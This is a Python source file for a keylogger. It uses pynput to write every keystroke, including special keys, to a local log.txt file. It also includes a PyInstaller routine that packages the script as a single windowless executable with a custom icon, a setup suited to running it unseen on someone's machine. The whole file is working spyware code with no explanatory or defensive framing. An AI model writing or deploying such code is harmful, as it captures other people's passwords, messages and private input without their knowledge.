import pynput
import sys
import os

def on_press(key):
    try:
        # Write the pressed key to a file
        with open('log.txt', 'a') as f:
            f.write(key.char)
    except AttributeError:
        # Special key pressed (e.g., backspace, enter)
        if key == pynput.keyboard.Key.space:
            with open('log.txt', 'a') as f:
                f.write(' ')
        elif key == pynput.keyboard.Key.enter:
            with open('log.txt', 'a') as f:
                f.write('\n')
        elif key == pynput.keyboard.Key.backspace:
            with open('log.txt', 'a') as f:
                f.write('\b')
        else:
            with open('log.txt', 'a') as f:
                f.write(f'[Special: {key}]')

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop listener
        print("🛑 Keylogger stopped.")
        return False

# Collect events until released
def start_keylogger():
    print("🟢 Starting keylogger...")
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to create an executable using PyInstaller
def create_executable():
    try:
        import PyInstaller.__main__ as pyinstaller
        print("⚙️ Creating executable...")
        pyinstaller.run([sys.argv[0], '--onefile', '--windowed', '--icon=icon.ico'])
        print("✅ Executable created successfully!")
    except ImportError:
        print("❌ PyInstaller is not installed. Please install it using 'pip install pyinstaller'.")
    except Exception as e:
        print(f"⚠️ An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == '--create-exe':
        create_executable()
    else:
        start_keylogger()
